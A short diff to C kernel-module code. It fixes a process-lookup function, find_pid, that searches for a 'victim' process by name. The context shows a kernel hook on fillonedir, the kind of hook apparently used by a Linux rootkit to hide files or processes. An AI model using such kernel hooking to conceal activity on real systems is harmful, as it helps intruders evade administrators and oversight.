@@ -47,15 +47,14 @@ static pid_t find_pid(const char *victim)
 	struct list_head * pos;
 	int count = 0;
 	task =& init_task;
-	pid_t p_id;
 	list_for_each(pos, &task->tasks)
 	{
 		p = list_entry(pos, struct task_struct, tasks);
 		count++;
 		if (strstr(p->comm, victim))
-			p_id = p->pid;
+			return p->pid;
 	}
-	return p_id;
+	return 0;
 }
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
